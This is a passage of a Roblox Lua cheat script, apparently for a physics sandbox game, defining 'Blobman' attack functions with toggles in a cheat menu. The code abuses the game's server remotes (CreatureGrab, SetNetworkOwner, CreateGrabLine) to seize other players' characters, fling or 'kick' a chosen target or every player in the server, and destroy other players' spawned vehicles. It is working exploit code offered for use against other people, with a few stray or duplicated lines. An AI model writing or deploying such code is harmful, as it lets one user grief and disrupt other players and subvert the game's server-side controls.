        KozBlobmanBetaFeature.ungrab(target)
        task.wait(0.02)
        KozBlobmanBetaFeature.blobGrab(blob, target, side)
        task.wait(0.02)
        KozBlobmanBetaFeature.blobDrop(blob, target, side)
        task.wait(0.02)
        KozBlobmanBetaFeature.ungrab(target)
    end
    function KozBlobmanBetaFeature.ensureBlob()
        local blob = KozBlobmanBetaFeature.getBlobman()
        if not blob then blob = KozBlobmanBetaFeature.findAnyBlobman() end
        if not blob then blob = KozBlobmanBetaFeature.spawnBlobman() end
        if not blob or not blob:FindFirstChild("VehicleSeat") then return nil end
        local hum = KozBlobmanBetaFeature.getLocalHum()
        local myRoot = KozBlobmanBetaFeature.getLocalRoot()
        if hum and myRoot and not hum.Sit then
            myRoot.CFrame = blob.VehicleSeat.CFrame + Vector3.new(0, 2, 0)
            blob.VehicleSeat:Sit(hum)
        end
        return KozBlobmanBetaFeature.getBlobman()
    end

    function KozBlobmanBetaFeature.getPCLDPosition(targetPlayer, referencePos)
        if not KozState.allPCLDParts then
            KozState.allPCLDParts = {}
            for _, part in ipairs(KozWS:GetDescendants()) do
                if part:IsA("BasePart") and part.Name == "PlayerCharacterLocationDetector" then
                    local p = part.Position
                    if not (p.X == 0 and p.Y == 0 and p.Z == 0) then
                        table.insert(KozState.allPCLDParts, part)
                    end
                end
            end
            if not KozState.pcldWatcherConn then
                KozState.pcldWatcherConn = KozWS.DescendantAdded:Connect(function(part)
                    if part:IsA("BasePart") and part.Name == "PlayerCharacterLocationDetector" then
                        local p = part.Position
                        if not (p.X == 0 and p.Y == 0 and p.Z == 0) then
                            table.insert(KozState.allPCLDParts, part)
                        end
                    end
                end)
            end
        end
        for i = #KozState.allPCLDParts, 1, -1 do
            if not KozState.allPCLDParts[i].Parent then
                table.remove(KozState.allPCLDParts, i)
            end
        end
        local ref = referencePos
        if not ref then
            local char = targetPlayer.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if hrp then ref = hrp.Position end
        end
        if not ref then return nil end
        local closest = nil
        local closestDist = 50
        for _, pcld in ipairs(KozState.allPCLDParts) do
            if pcld.Parent then
                local dist = (pcld.Position - ref).Magnitude
                if dist < closestDist then
                    closestDist = dist
                    closest = pcld
                end
            end
        end
        return closest
    end

    function KozBlobmanBetaFeature.forceSitBlobman()
        local blob = KozBlobmanBetaFeature.getBlobman()
        if not blob or not blob:FindFirstChild("VehicleSeat") then
            blob = KozBlobmanBetaFeature.findAnyBlobman()
        end
        if not blob or not blob:FindFirstChild("VehicleSeat") then
            blob = KozBlobmanBetaFeature.spawnBlobman()
        end
        if not blob or not blob:FindFirstChild("VehicleSeat") then return false end
        local seat = blob.VehicleSeat
        local myHum = KozBlobmanBetaFeature.getLocalHum()
        local myRoot = KozBlobmanBetaFeature.getLocalRoot()
        if not myHum or not myRoot then
            local myChar = KozPLR.Character
            if myChar then
                myHum = myHum or myChar:FindFirstChildOfClass("Humanoid")
                myRoot = myRoot or myChar:FindFirstChild("HumanoidRootPart")
            end
        end
        if not myHum or not myRoot then return false end
        if myHum.Sit and myHum.SeatPart == seat then return true end
        if seat.Occupant and seat.Occupant ~= myHum then
            pcall(function() seat.Occupant.Jump = true end)
            task.wait(0.15)
        end
        myRoot.Velocity = Vector3.zero
        myRoot.RotVelocity = Vector3.zero
        myRoot.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
        pcall(function() seat:Sit(myHum) end)
        task.wait(0.05)
        if myHum.Sit and myHum.SeatPart == seat then
            KozBlobmanBetaFeature.resetBlobmanPhysics()
            return true
        end
        return KozBlobmanBetaFeature.isSittingOnBlobman()
    end
    function KozBlobmanBetaFeature.checkTarget()
        if not kozKickTargetName() then warn("Select target") return nil end
        if isProtectedPlayer(kozKickTargetName()) then warn("Player is protected") return nil end
        local target = KozPlayers:FindFirstChild(kozKickTargetName())
        if not target then warn("Target not found") return nil end
        return target
    end
    function KozBlobmanBetaFeature.isValidTarget(plr, myRoot)
        if plr == KozPLR then return false end
        if isProtectedPlayer(plr.Name) then return false end
        if KozFlags.ignoreFriends or KozFlags.WhitelistFriends then
            local isFriend = false
            pcall(function() isFriend = plr:IsFriendsWith(KozPLR.UserId) end)
            if isFriend then return false end
        end
        local char = plr.Character
        if not char then return false end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return false end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then return false end
        local playerY = root.Position.Y
        if playerY < -25 then return false end
        for _, h in ipairs(KozFlags.ignoreHeights) do
            if math.abs(playerY - h) < 0.1 then return false end
        end
        return true
    end

    function KozBlobmanBetaFeature.destroyPlayerGucci(targetPlayer)
        if not targetPlayer or targetPlayer == KozPLR then return false end
        if isProtectedPlayer(targetPlayer.Name) then return false end
        local folderName = targetPlayer.Name .. "SpawnedInToys"
        local toysFolder = KozWS:FindFirstChild(folderName)
        if not toysFolder then return false end
        local myChar = KozPLR.Character
        if not myChar then return false end
        local myHum = myChar:FindFirstChild("Humanoid")
        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
        if not myHum or not myRoot then return false end
        for _, obj in ipairs(toysFolder:GetChildren()) do
            if obj.Name == "CreatureBlobman" or obj.Name == "TractorGreen" then
                local seat = obj:FindFirstChild("VehicleSeat") or obj:FindFirstChildWhichIsA("VehicleSeat", true)
                if seat then
                    local safeSpot = myRoot.CFrame
                    myRoot.CFrame = seat.CFrame
                    myRoot.Velocity = Vector3.zero
                    seat:Sit(myHum)
                    task.wait(0.3)
                    if myHum.SeatPart == seat then
                        myHum.Sit = false
                        task.wait(0.1)
                        myRoot.CFrame = safeSpot
                        task.wait(1)
                        obj:Destroy()
                        return true
                    else
                        myRoot.CFrame = safeSpot
                    end
                end
            end
        end
        return false
    end

    function KozBlobmanBetaFeature.StartDestroyGucciLoop()
        while KozFlags.destroyGucciActive or (AttackFuncs and AttackFuncs.destroyGucciActive) do
            for _, player in ipairs(KozPlayers:GetPlayers()) do
                if player ~= KozPLR and not isProtectedPlayer(player.Name) and player.Character then
                    KozBlobmanBetaFeature.destroyPlayerGucci(player)
                end
            end
            task.wait(2)
        end
    end

    function KozBlobmanBetaFeature.startDriftKick(targetName)
        driftAngle = 0
        local driftRadius = 19
        local driftSpeed = 12
        local driftHeightOffset = 0
        KozFlags.driftKickActive = true
        local myLoopId = tick()
        KozState.driftKickLoopId = myLoopId
        local driftSkipCounter = 0

        if KozState.driftKickConn then task.cancel(KozState.driftKickConn) end
        KozState.driftKickConn = task.spawn(function()
            local target = KozPlayers:FindFirstChild(targetName)
            if not target or target == KozPLR then
                KozFlags.driftKickActive = false
                return
            end

            local blob = KozBlobmanBetaFeature.getBlobman()
                or KozBlobmanBetaFeature.findAnyBlobman()
                or KozBlobmanBetaFeature.spawnBlobman()
            if not blob or not blob:FindFirstChild("VehicleSeat") then
                KozFlags.driftKickActive = false
                return
            end

            local scriptObj = blob:FindFirstChild("BlobmanSeatAndOwnerScript") or blob:FindFirstChild("BlobmanSeatAndOwnerScript[old]")
            local grabRemote = scriptObj and scriptObj:FindFirstChild("CreatureGrab")
            local dropRemote = scriptObj and scriptObj:FindFirstChild("CreatureDrop")
            local lDet = blob:FindFirstChild("LeftDetector")
            local rDet = blob:FindFirstChild("RightDetector")
            local lWeld = lDet and (lDet:FindFirstChild("LeftWeld") or lDet:FindFirstChildWhichIsA("Weld") or lDet:FindFirstChildWhichIsA("JointInstance") or lDet:FindFirstChild("RigidConstraint"))
            local rWeld = rDet and (rDet:FindFirstChild("RightWeld") or rDet:FindFirstChildWhichIsA("Weld") or rDet:FindFirstChildWhichIsA("JointInstance") or rDet:FindFirstChild("RigidConstraint"))
            local seat = blob:FindFirstChild("VehicleSeat")
            local GE = KozRS:FindFirstChild("GrabEvents")
            local blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
            local Det = rDet or lDet
            local Weld = rWeld or lWeld

            if not GE or not grabRemote or not dropRemote or not Det or not Weld or not blobRoot then
                KozFlags.driftKickActive = false
                return
            end

            local hum = KozPLR.Character and KozPLR.Character:FindFirstChild("Humanoid")
            local myHRP = KozPLR.Character and KozPLR.Character:FindFirstChild("HumanoidRootPart")
            if seat and hum then
                if seat.Occupant ~= hum then
                    myHRP.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
                    task.wait(0.2)
                    seat:Sit(hum)
                    task.wait(0.5)
                end
            end

            while KozFlags.driftKickActive do
                if myLoopId ~= KozState.driftKickLoopId then break end
                if not target or not target.Parent then break end

                local myChar = KozPLR.Character
                local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
                local mySeat = myHum and myHum.SeatPart
                if not mySeat or mySeat.Parent ~= blob then
                    KozFlags.driftKickActive = false
                    break
                end

                local tChar = target.Character
                local tHum = tChar and tChar:FindFirstChildOfClass("Humanoid")
                local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")

                if tChar and tRoot and tHum and tHum.Health > 0 then
                    local bringStart = tick()
                    while tick() - bringStart < 0.35 do
                        if myLoopId ~= KozState.driftKickLoopId or not KozFlags.driftKickActive or not blob or not blob.Parent then break end
                        if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                            local currentTRoot = target.Character.HumanoidRootPart
                            blobRoot.CFrame = currentTRoot.CFrame
                            blobRoot.AssemblyLinearVelocity = Vector3.zero
                            pcall(function()
                                if Det then grabRemote:FireServer(Det, currentTRoot, Weld) end
                                if driftSkipCounter % 3 == 0 then
                                    GE.SetNetworkOwner:FireServer(currentTRoot, blobRoot.CFrame)
                                elseif driftSkipCounter % 3 == 1 then
                                    GE.CreateGrabLine:FireServer(currentTRoot, Vector3.zero, currentTRoot.Position, false)
                                end
                            end)
                        end
                        driftSkipCounter = (driftSkipCounter + 1) % 3
                        KozRun.Heartbeat:Wait()
                    end
                    if myLoopId ~= KozState.driftKickLoopId or not KozFlags.driftKickActive or not blob or not blob.Parent then break end
                    tChar = target.Character
                    tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                    tHum = tChar and tChar:FindFirstChildOfClass("Humanoid")
                    if tChar and tRoot and tHum and tHum.Health > 0 then
                        local SavedPos = tRoot.CFrame
                        local targetCenterCFrame = SavedPos + Vector3.new(0, 30, 0)
                        local lastTime = tick()
                        local lastDropTime = tick()
                        local dropCount = 0
                        while KozFlags.driftKickActive and blob and blob.Parent do
                            if myLoopId ~= KozState.driftKickLoopId then break end
                            if not target or not target.Parent then break end
                            tChar = target.Character
                            tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                            tHum = tChar and tChar:FindFirstChildOfClass("Humanoid")
                            if not tChar or not tRoot or not tHum or tHum.Health <= 0 then break end
                            if dropCount < 2 and (tick() - lastDropTime) > 0.8 then
                                dropCount = dropCount + 1
                                pcall(function()
                                    local currentWeld = Det:FindFirstChild("RightWeld") or Det:FindFirstChild("LeftWeld") or Det:FindFirstChildWhichIsA("Weld") or Det:FindFirstChildWhichIsA("JointInstance") or Det:FindFirstChild("RigidConstraint")
                                    if currentWeld then dropRemote:FireServer(currentWeld) end
                                    KozRemote.DestroyGrabLine:FireServer(tRoot)
                                end)
                                blobRoot.CFrame = SavedPos
                                blobRoot.AssemblyLinearVelocity = Vector3.zero
                                driftSkipCounter = (driftSkipCounter + 1) % 3
                    KozRun.Heartbeat:Wait()
                    skipFrame = (skipFrame + 1) % 3
                                if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                                    local currentTRoot = target.Character.HumanoidRootPart
                                    blobRoot.CFrame = currentTRoot.CFrame
                                    blobRoot.AssemblyLinearVelocity = Vector3.zero
                                    pcall(function()
                                        if Det then grabRemote:FireServer(Det, currentTRoot, Weld) end
                                        if driftSkipCounter % 3 == 0 then
                                            GE.SetNetworkOwner:FireServer(currentTRoot, blobRoot.CFrame)
                                        elseif driftSkipCounter % 3 == 1 then
                                            GE.CreateGrabLine:FireServer(currentTRoot, Vector3.zero, currentTRoot.Position, false)
                                        end
                                    end)
                                end
                                lastTime = tick()
                                lastDropTime = tick()
                                continue
                            end
                            if tRoot and tHum and tHum.Health > 0 and blobRoot then
                                local currentTime = tick()
                                local dt = currentTime - lastTime
                                lastTime = currentTime
                                driftAngle = driftAngle + (driftSpeed * dt)
                                local offsetX = math.cos(driftAngle) * driftRadius
                                local offsetZ = math.sin(driftAngle) * driftRadius
                                local blobPos = targetCenterCFrame.Position + Vector3.new(offsetX, driftHeightOffset, offsetZ)
                                blobRoot.CFrame = CFrame.new(blobPos, targetCenterCFrame.Position)
                                blobRoot.AssemblyLinearVelocity = Vector3.zero
                                blobRoot.AssemblyAngularVelocity = Vector3.zero
                                tRoot.CFrame = targetCenterCFrame
                                tRoot.AssemblyLinearVelocity = Vector3.zero
                                tRoot.AssemblyAngularVelocity = Vector3.zero
                            pcall(function()
                                tHum.PlatformStand = true
                                tHum.Sit = true
                                if driftSkipCounter % 3 == 0 then
                                    GE.SetNetworkOwner:FireServer(tRoot, targetCenterCFrame)
                                elseif driftSkipCounter % 3 == 1 then
                                    KozRemote.DestroyGrabLine:FireServer(tRoot)
                                    GE.CreateGrabLine:FireServer(tRoot, Vector3.zero, targetCenterCFrame.Position, false)
                                end
                                local currentWeld = Det:FindFirstChild("RightWeld") or Det:FindFirstChild("LeftWeld") or Det:FindFirstChildWhichIsA("Weld") or Det:FindFirstChildWhichIsA("JointInstance") or Det:FindFirstChild("RigidConstraint")
                                if currentWeld then dropRemote:FireServer(currentWeld) end
                                if Det then grabRemote:FireServer(Det, tRoot, Weld) end
                            end)
                            else
                                break
                            end
                            driftSkipCounter = (driftSkipCounter + 1) % 3
                            KozRun.Heartbeat:Wait()
                        end
                        if not KozFlags.driftKickActive or myLoopId ~= KozState.driftKickLoopId then
                            if blobRoot and SavedPos then
                                pcall(function()
                                    local currentWeld = Det:FindFirstChild("RightWeld") or Det:FindFirstChild("LeftWeld") or Det:FindFirstChildWhichIsA("Weld") or Det:FindFirstChildWhichIsA("JointInstance") or Det:FindFirstChild("RigidConstraint")
                                    if currentWeld then dropRemote:FireServer(currentWeld) end
                                    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                                        KozRemote.DestroyGrabLine:FireServer(target.Character.HumanoidRootPart)
                                    end
                                end)
                                blobRoot.CFrame = SavedPos
                                blobRoot.AssemblyLinearVelocity = Vector3.zero
                            end
                            break
                        end
                    end
                end
                driftSkipCounter = (driftSkipCounter + 1) % 3
                KozRun.Heartbeat:Wait()
            end
            KozFlags.driftKickActive = false
        end)
    end

    function KozBlobmanBetaFeature.stopDriftKick()
        KozFlags.driftKickActive = false
        KozState.driftKickLoopId = tick()

        if KozState.driftKickConn then
            task.cancel(KozState.driftKickConn)
            KozState.driftKickConn = nil
        end

        local tName = kozKickTargetName()
        local blob = KozBlobmanBetaFeature.getBlobman()

        if blob then
            local scriptObj = blob:FindFirstChild("BlobmanSeatAndOwnerScript", true)
            local dropRemote = scriptObj and scriptObj:FindFirstChild("CreatureDrop")
            local GE = KozRS:FindFirstChild("GrabEvents")
            local Det = blob:FindFirstChild("RightDetector") or blob:FindFirstChild("LeftDetector")
            local Weld = Det and (Det:FindFirstChild("RightWeld") or Det:FindFirstChild("LeftWeld") or Det:FindFirstChildWhichIsA("Weld") or Det:FindFirstChildWhichIsA("JointInstance") or Det:FindFirstChild("RigidConstraint"))
            if dropRemote and Weld then
                pcall(function() dropRemote:FireServer(Weld) end)
            end
            if GE then
                if tName then
                    local tPlayer = KozPlayers:FindFirstChild(tName)
                    local tChar = tPlayer and tPlayer.Character
                    local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                    if tRoot then
                        pcall(function() KozRemote.DestroyGrabLine:FireServer(tRoot) end)
                    end
                end
                pcall(function() KozRemote.DestroyGrabLine:FireServer(KozPLR.Character.HumanoidRootPart) end)
            end
            local blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
            if blobRoot then
                pcall(function()
                    blobRoot.AssemblyLinearVelocity = Vector3.zero
                    blobRoot.AssemblyAngularVelocity = Vector3.zero
                end)
            end
        end

        if tName then
            local tPlayer = KozPlayers:FindFirstChild(tName)
            local tChar = tPlayer and tPlayer.Character
            if tChar then
                local tHum = tChar:FindFirstChildOfClass("Humanoid")
                if tHum then
                    pcall(function()
                        tHum.PlatformStand = false
                        tHum.Sit = false
                    end)
                end
            end
        end

        local myChar = KozPLR.Character
        local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
        if myHum then
            pcall(function()
                myHum.PlatformStand = false
                myHum.Sit = false
            end)
        end
    end

    function KozBlobmanBetaFeature.startKickAllV2()
        KozFlags.kickAllV2Active = true
        if KozState.kickAllV2Conn then task.cancel(KozState.kickAllV2Conn) end
        KozState.kickAllV2Conn = task.spawn(function()
            local allPlayers = {}
            for _, p in ipairs(KozPlayers:GetPlayers()) do
                if p ~= KozPLR and not isProtectedPlayer(p.Name) then
                    if KozFlags.ignoreFriends then
                        local isFriend = false
                        pcall(function() isFriend = KozPLR:IsFriendsWith(p.UserId) end)
                        if isFriend then continue end
                    end
                    table.insert(allPlayers, p)
                end
            end
            if #allPlayers == 0 then KozFlags.kickAllV2Active = false return end

            local myChar = KozPLR.Character
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
            if not myHRP or not myHum then KozFlags.kickAllV2Active = false return end

            local currentBlob = KozBlobmanBetaFeature.getBlobman()
                or KozBlobmanBetaFeature.findAnyBlobman()
                or KozBlobmanBetaFeature.spawnBlobman()
            if not currentBlob or not currentBlob:FindFirstChild("VehicleSeat") then
                KozFlags.kickAllV2Active = false return
            end

            local vehicleSeat = currentBlob.VehicleSeat
            if not myHum.Sit or myHum.SeatPart ~= vehicleSeat then
                if vehicleSeat.Occupant and vehicleSeat.Occupant ~= myHum then
                    pcall(function() vehicleSeat.Occupant.Jump = true end)
                    task.wait(0.1)
                end
                local sitStart = tick()
                while KozFlags.kickAllV2Active and tick() - sitStart < 0.5 do
                    if not currentBlob or not currentBlob.Parent then break end
                    myHRP.CFrame = vehicleSeat.CFrame + Vector3.new(0, 2, 0)
                    pcall(function() vehicleSeat:Sit(myHum) end)
                    if myHum.Sit and myHum.SeatPart == vehicleSeat then break end
                    task.wait(0.03)
                end
            end
                if not (myHum.Sit and myHum.SeatPart and myHum.SeatPart.Parent and myHum.SeatPart.Parent.Name == "CreatureBlobman") then
                    KozFlags.kickAllV2Active = false return
                end

                local MyBlob = myHum.SeatPart.Parent
                local scr = MyBlob:FindFirstChild("BlobmanSeatAndOwnerScript") or MyBlob:FindFirstChild("BlobmanSeatAndOwnerScript[old]")
                local CreatureGrab = scr and scr:FindFirstChild("CreatureGrab")
                local CreatureRelease = scr and scr:FindFirstChild("CreatureRelease")

                local allPlayers = {}
                for _, p in ipairs(KozPlayers:GetPlayers()) do
                    if p ~= KozPLR and not isProtectedPlayer(p.Name) then
                        if KozFlags.ignoreFriends then
                            local isFriend = false
                            pcall(function() isFriend = KozPLR:IsFriendsWith(p.UserId) end)
                            if isFriend then continue end
                        end
                        local tChar = p.Character
                        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                        local tHum = tChar and tChar:FindFirstChildOfClass("Humanoid")
                        if tRoot and tHum and tHum.Health > 0 then
                            table.insert(allPlayers, p)
                        end
                    end
                end
                if #allPlayers == 0 then KozFlags.kickAllV2Active = false return end

                for _, targetPlayer in ipairs(allPlayers) do
                    local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if targetRoot then
                        myHRP.CFrame = targetRoot.CFrame
                        task.wait(0.02)
                        for i = 1, 3 do
                            pcall(function()
                                CreatureGrab:FireServer(MyBlob.LeftDetector, targetRoot, MyBlob.LeftDetector.LeftWeld)
                                CreatureRelease:FireServer(MyBlob.LeftDetector.LeftWeld)
                            end)
                            if i < 3 then task.wait(0.08) end
                        end
                    end
                end

            local MyBlob = myHum.SeatPart.Parent
            local LeftDetector = MyBlob:FindFirstChild("LeftDetector")
            local RightDetector = MyBlob:FindFirstChild("RightDetector")
            local LeftWeld = LeftDetector and (LeftDetector:FindFirstChild("LeftWeld") or LeftDetector:FindFirstChildWhichIsA("Weld") or LeftDetector:FindFirstChildWhichIsA("RigidConstraint"))
            local RightWeld = RightDetector and (RightDetector:FindFirstChild("RightWeld") or RightDetector:FindFirstChildWhichIsA("Weld") or RightDetector:FindFirstChildWhichIsA("RigidConstraint"))
            local scr = MyBlob:FindFirstChild("BlobmanSeatAndOwnerScript") or MyBlob:FindFirstChild("BlobmanSeatAndOwnerScript[old]")
            local CreatureGrab = scr and scr:FindFirstChild("CreatureGrab")
            local CreatureRelease = scr and scr:FindFirstChild("CreatureRelease")

            if not CreatureGrab or not CreatureRelease or not LeftDetector or not LeftWeld then
                KozFlags.kickAllV2Active = false return
            end

            for _, targetPlayer in ipairs(allPlayers) do
                if not KozFlags.kickAllV2Active then break end
                local targetChar = targetPlayer.Character
                local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    myHRP.CFrame = targetRoot.CFrame
                    task.wait(0.02)
                    for i = 1, 3 do
                        if not KozFlags.kickAllV2Active then break end
                        pcall(function()
                            CreatureGrab:FireServer(LeftDetector, targetRoot, LeftWeld)
                            CreatureRelease:FireServer(LeftWeld)
                        end)
                        if i < 3 then task.wait(0.08) end
                    end
                end
            end

            myHRP.CFrame = CFrame.new(0, 100, 0)
            task.wait(0.1)
            for _, part in ipairs(MyBlob:GetDescendants()) do
                if part:IsA("BasePart") then pcall(function() part.Anchored = true end) end
            end
            task.wait(0.1)

            local radius = 15
            for i, targetPlayer in ipairs(allPlayers) do
                local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    local angle = math.rad((i - 1) * (360 / #allPlayers))
                    local x = radius * math.cos(angle)
                    local z = radius * math.sin(angle)
                    targetRoot.CFrame = CFrame.new(x, 110, z)
                end
            end
            task.wait(0.1)

            for _ = 1, 2 do
                for _, targetPlayer in ipairs(allPlayers) do
                    local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if targetRoot then
                        pcall(function()
                            KozRemote.SetNetworkOwner:FireServer(targetRoot, CFrame.new(targetRoot.Position))
                            KozRemote.DestroyGrabLine:FireServer(targetRoot)
                        end)
                    end
                end
                task.wait(0.1)
            end
            task.wait(0.3)

            for _, targetPlayer in ipairs(allPlayers) do
                if not KozFlags.kickAllV2Active then break end
                local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    pcall(function()
                        CreatureGrab:FireServer(LeftDetector, targetRoot, LeftWeld)
                    end)
                    if RightDetector and RightWeld then
                        pcall(function()
                            CreatureGrab:FireServer(RightDetector, targetRoot, RightWeld)
                        end)
                    end
                end
            end

            for _, part in ipairs(MyBlob:GetDescendants()) do
                if part:IsA("BasePart") then pcall(function() part.Anchored = false end) end
            end

            KozFlags.kickAllV2Active = false
        end)
    end

    function KozBlobmanBetaFeature.stopKickAllV2()
        KozFlags.kickAllV2Active = false
        if KozState.kickAllV2Conn then task.cancel(KozState.kickAllV2Conn) KozState.kickAllV2Conn = nil end
    end

    local function cleanupBlobmanLocks()
        local myChar = KozPLR.Character
        if not myChar then return end
        local myHum = myChar:FindFirstChildOfClass("Humanoid")
        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
        if myHum then
            myHum.PlatformStand = false
            myHum.Sit = false
            pcall(function() myHum.Jump = true end)
        end

        local tName = kozKickTargetName()
        if tName then
            local tPlayer = KozPlayers:FindFirstChild(tName)
            local tChar = tPlayer and tPlayer.Character
            local tHum = tChar and tChar:FindFirstChildOfClass("Humanoid")
            local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
            if tHum then
                tHum.PlatformStand = false
                tHum.Sit = false
            end
            if tChar then
                for _, part in ipairs(tChar:GetDescendants()) do
                    if part:IsA("BasePart") then
                        for _, p in ipairs(part:GetChildren()) do
                            if p:IsA("BodyPosition") or p:IsA("BodyGyro") or p:IsA("BodyVelocity") or p:IsA("BodyForce") then
                                pcall(function() p:Destroy() end)
                            end
                        end
                    end
                end
            end
            if tRoot then
                pcall(function() KozRemote.DestroyGrabLine:FireServer(tRoot) end)
            end
        end

        local blob = KozBlobmanBetaFeature.getBlobman()
        if blob then
            local scr = blob:FindFirstChild("BlobmanSeatAndOwnerScript", true)
            if scr then
                local CD = scr:FindFirstChild("CreatureDrop")
                local R_Det = blob:FindFirstChild("RightDetector")
                if CD and R_Det then
                    local weld = R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChildWhichIsA("Weld")
                    if weld then pcall(function() CD:FireServer(weld) end) end
                end
                local L_Det = blob:FindFirstChild("LeftDetector")
                if L_Det then
                    local lw = L_Det:FindFirstChild("LeftWeld")
                    if lw and CD then pcall(function() CD:FireServer(lw) end) end
                end
            end
            for _, part in ipairs(blob:GetDescendants()) do
                if part:IsA("BasePart") then
                    pcall(function()
                        part.CanCollide = true
                        part.Anchored = false
                    end)
                end
            end
            local detL = blob:FindFirstChild("LeftDetector")
            local detR = blob:FindFirstChild("RightDetector")
            if detL then
                for _, w in ipairs(detL:GetChildren()) do
                    if w:IsA("Weld") or w:IsA("WeldConstraint") then pcall(function() w:Destroy() end) end
                end
            end
            if detR then
                for _, w in ipairs(detR:GetChildren()) do
                    if w:IsA("Weld") or w:IsA("WeldConstraint") then pcall(function() w:Destroy() end) end
                end
            end
        end
        if myRoot then
            local GE = KozRS:FindFirstChild("GrabEvents")
            if KozRemote.DestroyGrabLine then
                pcall(function() KozRemote.DestroyGrabLine:FireServer(myRoot) end)
                for _, part in ipairs(myChar:GetDescendants()) do
                    if part:IsA("BasePart") then
                        pcall(function() KozRemote.DestroyGrabLine:FireServer(part) end)
                    end
                end
            end
        end
    end

    local kickTask = nil
    local kickV2BlobRoot = nil
    local kickV4Cleanup = nil
    local kickSeatConn = nil

    local function stopAllKicks()
        KozFlags.kickActive = false
        KozFlags.kickV2Active = false
        KozFlags.kickV4Active = false
        KozFlags.driftKickActive = false
        KozFlags.kickCooldownFrames = 2
        if kickV2BlobRoot then pcall(function() kickV2BlobRoot.Anchored = false end) kickV2BlobRoot = nil end
        if kickV4Cleanup then pcall(kickV4Cleanup) kickV4Cleanup = nil end
        KozBlobmanBetaFeature.stopDriftKick()
        cleanupBlobmanLocks()

        task.delay(0.5, function()
            if KozFlags.kickActive or KozFlags.kickV2Active or KozFlags.driftKickActive then return end
            local c = KozPLR.Character
            local h = c and c:FindFirstChildOfClass("Humanoid")
            local r = c and c:FindFirstChild("HumanoidRootPart")
            if r then
                for _, p in ipairs(r:GetChildren()) do
                    if p:IsA("BodyPosition") or p:IsA("BodyGyro") or p:IsA("BodyVelocity") or p:IsA("BodyForce") then
                        pcall(function() p:Destroy() end)
                    end
                end
            end
            if h then
                h.PlatformStand = false
                h.Sit = false
            end
            local tName = kozKickTargetName()
            if tName then
                local tPlayer = KozPlayers:FindFirstChild(tName)
                local tChar = tPlayer and tPlayer.Character
                if tChar then
                    for _, part in ipairs(tChar:GetDescendants()) do
                        if part:IsA("BasePart") then
                            for _, p in ipairs(part:GetChildren()) do
                                if p:IsA("BodyPosition") or p:IsA("BodyGyro") or p:IsA("BodyVelocity") or p:IsA("BodyForce") then
                                    pcall(function() p:Destroy() end)
                                end
                            end
                        end
                    end
                    local tHum = tChar:FindFirstChildOfClass("Humanoid")
                    if tHum then
                        pcall(function()
                            tHum.PlatformStand = false
                            tHum.Sit = false
                        end)
                    end
                end
            end
        end)
    end

    KozPLR.CharacterAdded:Connect(function(char)
        KozFlags.kickActive = false
        KozFlags.kickV2Active = false
        KozFlags.kickV4Active = false
        KozFlags.driftKickActive = false
        KozFlags.driftKickActive = false
        if kickTask then task.cancel(kickTask) kickTask = nil end
        if kickV2BlobRoot then pcall(function() kickV2BlobRoot.Anchored = false end) kickV2BlobRoot = nil end
        if kickV4Cleanup then pcall(kickV4Cleanup) kickV4Cleanup = nil end
        KozState.driftKickLoopId = tick()
        if KozState.driftKickConn then pcall(function() task.cancel(KozState.driftKickConn) end) KozState.driftKickConn = nil end
        if KozState.driftKickTargetBodyPos then pcall(function() KozState.driftKickTargetBodyPos:Destroy() end) KozState.driftKickTargetBodyPos = nil end
        if KozState.driftKickTargetBodyGyro then pcall(function() KozState.driftKickTargetBodyGyro:Destroy() end) KozState.driftKickTargetBodyGyro = nil end

        char:WaitForChild("HumanoidRootPart", 5)
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then
            for _, p in ipairs(hrp:GetChildren()) do
                if p:IsA("BodyPosition") or p:IsA("BodyGyro") or p:IsA("BodyVelocity") or p:IsA("BodyForce") then
                    pcall(function() p:Destroy() end)
                end
            end
        end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.PlatformStand = false
            hum.Sit = false
        end
        local tName = kozKickTargetName()
        if tName then
            local tPlayer = KozPlayers:FindFirstChild(tName)
            local tChar = tPlayer and tPlayer.Character
            if tChar then
                for _, part in ipairs(tChar:GetDescendants()) do
                    if part:IsA("BasePart") then
                        for _, p in ipairs(part:GetChildren()) do
                            if p:IsA("BodyPosition") or p:IsA("BodyGyro") or p:IsA("BodyVelocity") or p:IsA("BodyForce") then
                                pcall(function() p:Destroy() end)
                            end
                        end
                    end
                end
                local tHum = tChar:FindFirstChildOfClass("Humanoid")
                if tHum then
                    pcall(function()
                        tHum.PlatformStand = false
                        tHum.Sit = false
                    end)
                end
            end
        end
    end)

    AttackMethodsGroupbox:AddToggle("KozBlobKick", {
        Text = "Kick",
        Default = false,
        Callback = function(v)
            if not v then
                stopAllKicks()
